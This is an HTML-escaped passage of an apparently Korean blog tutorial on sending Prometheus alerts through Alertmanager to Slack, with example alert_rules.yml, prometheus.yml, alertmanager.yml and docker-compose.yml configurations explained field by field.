      &lt;li&gt;판넬 위젯 우상단에 (세로로 … ) 클릭&lt;/li&gt;
      &lt;li&gt;(드롭다운 메뉴에서) 판넬 삭제하고 싶으면 Remove 클릭&lt;/li&gt;
      &lt;li&gt;(드롭다운 메뉴에서) 판넬 수정하고 싶으면 Edit 클릭&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;alertmanager-알람-전송&quot;&gt;alertmanager 알람 전송&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;설명
    &lt;ul&gt;
      &lt;li&gt;프로메테우스 메트릭을 이용하여 조건 충족 시 알람을 전송하게 할 수 있다.&lt;/li&gt;
      &lt;li&gt;그라파나에도 알람이 존재하나&lt;br /&gt;
알람을 보내기 위해 무거운 그라파나를 항시 켜둬야 하는 문제와&lt;br /&gt;
그라파나 다운 시 알람이 동작하지 않는 문제가 발생할 수 있기에&lt;br /&gt;
alertmanager를 선택하였다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;alert_rules.yml
    &lt;ul&gt;
      &lt;li&gt;설명
        &lt;ul&gt;
          &lt;li&gt;구체적인 알림을 설정하는 부분이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;기본적인 구조
        &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;그룹_이름&lt;/span&gt;  
      &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;알람_이름&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;경고를 발생시킬 조건 (PromQL)&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;경고 지속 시간&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
            &lt;span class=&quot;na&quot;&gt;severity&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;경고 심각도&lt;/span&gt;  
          &lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
            &lt;span class=&quot;na&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;요약&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;메시지&quot;&lt;/span&gt;  
            &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;알람&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;상세&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;설명&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;구체적 설명
        &lt;ul&gt;
          &lt;li&gt;groups
            &lt;ul&gt;
              &lt;li&gt;알람 규칙을 그룹으로 묶음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;rules
            &lt;ul&gt;
              &lt;li&gt;이 그룹 안에서 설정할 개별 알람 목록&lt;/li&gt;
              &lt;li&gt;하나의 그룹 안에 여러 개의 알람 추가 가능&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;alert: 알람_이름
            &lt;ul&gt;
              &lt;li&gt;알람의 이름&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;expr: 경고를 발생시킬 조건 (PromQL)
            &lt;ul&gt;
              &lt;li&gt;PromQL로 알람 조건을 정의&lt;/li&gt;
              &lt;li&gt;예제:  메모리 사용률이 80%를 초과하면 경고
                &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;node_memory_Active_bytes / node_memory_MemTotal_bytes &amp;gt; 0.8&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;for: 경고 지속 시간
            &lt;ul&gt;
              &lt;li&gt;경고 조건이 특정 시간 동안 지속될 경우 알람을 발생시킴&lt;/li&gt;
              &lt;li&gt;예제:  5분 동안 조건이 충족되면 알람 발생
                &lt;ul&gt;
                  &lt;li&gt;for: 5m&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;labels
            &lt;ul&gt;
              &lt;li&gt;알람의 속성(라벨)을 지정&lt;/li&gt;
              &lt;li&gt;주로 severity(심각도)를 설정&lt;/li&gt;
              &lt;li&gt;예제: warning
                &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;severity&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;warning&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;annotations
            &lt;ul&gt;
              &lt;li&gt;알람이 발생했을 때 추가 메시지를 설정&lt;/li&gt;
              &lt;li&gt;summary: 간단한 알람 설명&lt;/li&gt;
              &lt;li&gt;description: 상세한 알람 내용&lt;/li&gt;
              &lt;li&gt;summary와 description은 Go Template이다.&lt;/li&gt;
              &lt;li&gt;예제
                &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;summary&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;메모리&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;사용량이&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;높습니다!&quot;&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$labels.instance&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}의&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;메모리&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;사용률이&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80%를&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;초과했습니다.&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;prometheus.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;na&quot;&gt;alerting&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;alertmanagers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;static_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;targets&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
            &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alertmanager:9093'&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Alertmanager의 주소  &lt;/span&gt;
            
&lt;span class=&quot;na&quot;&gt;rule_files&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/etc/prometheus/alert_rules.yml'&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# 알림 규칙 파일  &lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;ul&gt;
      &lt;li&gt;프로메테우스에 alert_rules.yml을 등록한다.&lt;/li&gt;
      &lt;li&gt;얼럿매니저를 등록한다.&lt;/li&gt;
      &lt;li&gt;이때 alertmanger:9093 중 alertmanger은 도커 서비스 명이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;alertmanager.yml
    &lt;ul&gt;
      &lt;li&gt;설명
        &lt;ul&gt;
          &lt;li&gt;global - alertmanager의 전역 설정&lt;/li&gt;
          &lt;li&gt;route - 알람을 어떻게 라우팅할지 설정&lt;/li&gt;
          &lt;li&gt;receivers - 알림을 받을 대상 설정&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;기본적 구조
        &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;resolve_timeout&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;알람 해제 후 유지 시간&lt;/span&gt;  
                  
  &lt;span class=&quot;na&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;group_by&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;알람 그룹 기준&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;group_wait&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;최초 알람 대기 시간&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;group_interval&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;그룹 내 추가 알람 무시 시간&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;repeat_interval&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;같은 알람 반복 전송 시간&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;receiver&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;기본 수신자&lt;/span&gt;  
                  
  &lt;span class=&quot;na&quot;&gt;receivers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;수신자_이름&lt;/span&gt;  
      &lt;span class=&quot;s&quot;&gt;알람 전송 방식 설정&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;구체적 설명
        &lt;ul&gt;
          &lt;li&gt;global
            &lt;ul&gt;
              &lt;li&gt;algermanager 전역 설정&lt;/li&gt;
              &lt;li&gt;resolve_timeout
                &lt;ul&gt;
                  &lt;li&gt;알람이 해결된 후 해제 상태를 유지하는 시간&lt;/li&gt;
                  &lt;li&gt;알람 조건이 충족되어 알람이 전송된 후&lt;br /&gt;
운영자가 조치하여 알람 조건이 해제되었다고 하자.&lt;br /&gt;
그 상태가 resolve_timeout 시간만큼 지나면 “해제됨” 상태가 된다.&lt;br /&gt;
헤제됨 상태가 되면 프로메테우스에서 해당 알람 상태가 inactive 된다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;route
            &lt;ul&gt;
              &lt;li&gt;알람을 그룹화하고 전달하는 방식&lt;/li&gt;
              &lt;li&gt;group_by
                &lt;ul&gt;
                  &lt;li&gt;같은 그룹으로 묶을 라벨 지정&lt;/li&gt;
                  &lt;li&gt;alert_rules.yml의 groups &amp;gt; rules &amp;gt; labels에 따라 &lt;br /&gt;
group by 하게 된다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;group_wait
                &lt;ul&gt;
                  &lt;li&gt;첫 번째 알람이 발생한 후 전송하기 전 대기 시간&lt;/li&gt;
                  &lt;li&gt;처음 한 개의 알람이 발생하면 프로메테우스에서 &lt;br /&gt;
“혹시 이거랑 같이 묶을 수 있는 다른 알람도 곧 생기지 않을까?” &lt;br /&gt;
하고 기다리는 시간&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;group_interval
                &lt;ul&gt;
                  &lt;li&gt;같은 그룹 내에서 추가 알람 발생 시 추가 알람 무시 시간&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;repeat_interval
                &lt;ul&gt;
                  &lt;li&gt;동일 알람이 반복될 경우 무시하는 시간&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;receiver
                &lt;ul&gt;
                  &lt;li&gt;알람을 보낼 기본 수신자 설정&lt;/li&gt;
                  &lt;li&gt;아래 receivers에서 설정한 name 중 하나를 입력한다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;receivers
            &lt;ul&gt;
              &lt;li&gt;알람을 받을 대상 설정(Slcak, Email 등)&lt;/li&gt;
              &lt;li&gt;name: 수신자 이름&lt;/li&gt;
              &lt;li&gt;알람 전송 방식 설정: Slack, Email 등의 설정 추가
                &lt;ul&gt;
                  &lt;li&gt;슬랙 예시
                    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;                  
&lt;span class=&quot;na&quot;&gt;receivers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;slack-notifications'&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;slack_configs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;your&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;slack-webhook&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;URL&amp;gt;'&lt;/span&gt;  
        &lt;span class=&quot;na&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#alarm'&lt;/span&gt;  
        &lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;{{ range $i, .Alerts }}&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;{{ if ne $i 0 }}\n--\n{{ end }}&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;*Alert:* {{ .Annotations.summary }}\n&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;*Description:* {{ .Annotations.description }}\n&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;*View Alert:* &amp;lt;http://localhost:9093/#/alerts?silenced=false&amp;amp;inhibited=false&amp;amp;active=true&amp;amp;filter=%7Balertname%3D%22{{ .Labels.alertname }}%22%7D|Click here&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;{{ end }}&lt;/span&gt;

          &lt;span class=&quot;no&quot;&gt;        &lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                  &lt;li&gt;api_url
                    &lt;ul&gt;
                      &lt;li&gt;유효한 webhook 주소를 반드시 적어야 함&lt;/li&gt;
                      &lt;li&gt;&lt;a href=&quot;https://help.ovice.com/hc/ko/articles/16515667939737--Webhook-%EC%84%A4%EC%A0%95-Slack%EC%97%90%EC%84%9C-%EC%95%8C%EB%A6%BC-%EB%B0%9B%EA%B8%B0&quot; target=&quot;_blank&quot;&gt;슬랙 웹훅 생성법&lt;/a&gt;&lt;br /&gt;
(1~13번까지 따라하고 웹훅 URL 복사하여 api_url에 붙여넣기)&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;docker-compose.yml
    &lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;  &lt;span class=&quot;na&quot;&gt;prometheus&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/prometheus:latest&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml&quot;&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# !-- 추가 시작 --! #  &lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./prometheus/alert_rules.yml:/etc/prometheus/alert_rules.yml&quot;&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;# !-- 추가 끝 --! #  &lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9090:9090&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;web&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;app-network&lt;/span&gt;  
            
  &lt;span class=&quot;na&quot;&gt;alertmanager&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prom/alertmanager:latest&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alertmanager&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;always&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9093:9093&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./prometheus/alertmanager.yml:/etc/alertmanager/config.yml&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--config.file=/etc/alertmanager/config.yml'&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prometheus&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;app-network&lt;/span&gt;  
